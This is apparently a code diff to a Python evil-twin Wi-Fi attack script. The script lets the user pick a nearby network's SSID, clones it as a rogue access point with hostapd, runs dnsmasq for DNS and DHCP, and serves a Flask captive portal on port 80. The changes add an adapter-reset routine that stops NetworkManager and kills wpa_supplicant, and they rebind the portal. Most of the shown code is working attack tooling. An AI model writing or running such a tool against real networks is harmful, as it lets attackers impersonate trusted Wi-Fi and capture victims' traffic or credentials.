@@ -1,7 +1,7 @@
 import os
 import subprocess
 import time
-from flask import Flask, request, redirect, render_template_string
+from flask import Flask, request, render_template_string
 
 app = Flask(__name__)
 
@@ -24,25 +24,6 @@ def list_wifi_adapters():
         print(f"[!] Error listing Wi-Fi adapters: {e}")
         return []
 
-# Function to kill wpa_supplicant process
-def kill_wpa_supplicant(adapter):
-    try:
-        print(f"[*] Checking for wpa_supplicant processes bound to {adapter}...")
-        result = subprocess.run(["ps", "aux"], capture_output=True, text=True)
-        lines = [line for line in result.stdout.splitlines() if "wpa_supplicant" in line and adapter in line]
-        
-        if lines:
-            for line in lines:
-                pid = line.split()[1]  # Extract the PID (second column)
-                print(f"[!] Killing wpa_supplicant process with PID: {pid}")
-                subprocess.run(["kill", "-9", pid], check=True)
-            time.sleep(1)  # Allow time for the process to be terminated
-        else:
-            print("[*] No wpa_supplicant processes found for this adapter.")
-    except Exception as e:
-        print(f"[!] Error killing wpa_supplicant: {e}")
-        exit(1)
-
 # Function to scan for available Wi-Fi networks
 def scan_wifi(adapter):
     try:
@@ -62,12 +43,49 @@ def scan_wifi(adapter):
         print(f"[!] Error during Wi-Fi scan: {e}")
         return []
 
+# Function to reset the adapter and stop interfering processes
+def reset_adapter(adapter):
+    try:
+        print(f"[*] Resetting the adapter: {adapter}")
+
+        # Stop NetworkManager to prevent interference
+        print("[*] Stopping NetworkManager...")
+        subprocess.run(["systemctl", "stop", "NetworkManager"], check=True)
+
+        # Kill wpa_supplicant processes related to the adapter
+        print("[*] Checking for wpa_supplicant processes...")
+        result = subprocess.run(["ps", "aux"], capture_output=True, text=True)
+        lines = [line for line in result.stdout.splitlines() if "wpa_supplicant" in line and adapter in line]
+
+        if lines:
+            for line in lines:
+                pid = line.split()[1]  # Extract the PID (second column)
+                print(f"[!] Killing wpa_supplicant process with PID: {pid}")
+                subprocess.run(["kill", "-9", pid], check=True)
+            time.sleep(1)  # Allow time for the process to terminate
+        else:
+            print("[*] No wpa_supplicant processes found for this adapter.")
+
+        # Bring the adapter down
+        print(f"[*] Bringing down the adapter: {adapter}")
+        subprocess.run(["ip", "link", "set", adapter, "down"], check=True)
+
+        # Bring the adapter back up
+        print(f"[*] Bringing up the adapter: {adapter}")
+        subprocess.run(["ip", "link", "set", adapter, "up"], check=True)
+
+    except subprocess.CalledProcessError as e:
+        print(f"[!] Error resetting adapter: {e}")
+        exit(1)
+    except Exception as e:
+        print(f"[!] Unexpected error during adapter reset: {e}")
+        exit(1)
+
 # Function to set up a rogue access point
 def setup_rogue_ap(adapter, ssid):
     try:
         print(f"[*] Setting up rogue access point for SSID: {ssid} on {adapter}...")
-        hostapd_config = "/etc/hostapd/hostapd.conf"
-        with open(hostapd_config, "w") as f:
+        with open("/etc/hostapd/hostapd.conf", "w") as f:
             f.write(f"interface={adapter}\n")
             f.write(f"driver=nl80211\n")
             f.write(f"ssid={ssid}\n")
@@ -80,9 +98,8 @@ def setup_rogue_ap(adapter, ssid):
             f.write(f"rsn_pairwise=CCMP\n")
 
         # Stop NetworkManager to avoid conflicts
-        subprocess.run(["systemctl", "stop", "NetworkManager"], check=True)
-        kill_wpa_supplicant(adapter)  # Kill wpa_supplicant before proceeding
-        subprocess.run(["hostapd", hostapd_config], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
+        subprocess.run(["airmon-ng", "check", "kill"], check=True)
+        subprocess.run(["hostapd", "/etc/hostapd/hostapd.conf"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
     except subprocess.CalledProcessError as e:
         print(f"[!] Error setting up rogue access point: {e}")
         exit(1)
@@ -94,8 +111,7 @@ def setup_rogue_ap(adapter, ssid):
 def setup_dns_dhcp(adapter):
     try:
         print("[*] Setting up DNS and DHCP...")
-        dnsmasq_config = "/etc/dnsmasq.conf"
-        with open(dnsmasq_config, "w") as f:
+        with open("/etc/dnsmasq.conf", "w") as f:
             f.write(f"interface={adapter}\n")
             f.write("dhcp-range=192.168.1.10,192.168.1.100,12h\n")
             f.write("dhcp-option=3,192.168.1.1\n")
@@ -165,7 +181,8 @@ def main():
             print("[!] Invalid selection. Exiting.")
             exit(1)
 
-        # Step 5: Set up rogue access point
+        # Step 5: Reset the adapter and set up the rogue access point
+        reset_adapter(selected_adapter)
         setup_rogue_ap(selected_adapter, selected_ssid)
 
         # Step 6: Set up DNS and DHCP
@@ -173,7 +190,7 @@ def main():
 
         # Step 7: Start the captive portal
         print("[*] Starting captive portal...")
-        app.run(host="0.0.0.0", port=80)
+        app.run(host="192.168.1.1", port=80)
 
     except KeyboardInterrupt:
         print("\n[*] Script interrupted by user. Exiting.")
